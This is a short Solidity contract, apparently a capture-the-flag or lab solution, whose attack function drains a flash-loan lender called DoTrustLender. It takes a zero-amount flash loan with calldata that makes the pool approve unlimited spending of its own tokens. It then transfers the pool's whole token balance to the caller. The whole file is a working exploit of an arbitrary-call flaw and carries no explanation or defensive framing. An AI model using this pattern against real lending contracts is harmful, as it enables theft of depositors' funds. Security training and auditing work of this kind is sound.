// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "contracts/DoNotTrust/DoTrustLender.sol";

contract DoNotTrustBob {
    function attack(address _pool, address _token) public {
        DoTrustLender pool = DoTrustLender(_pool);
        IERC20 token = IERC20(_token);

        bytes memory data = abi.encodeCall(IERC20.approve, (address(this), type(uint256).max));
        pool.flashLoan(0, msg.sender, _token, data);

        token.transferFrom(_pool, msg.sender, token.balanceOf(_pool));
    }
}
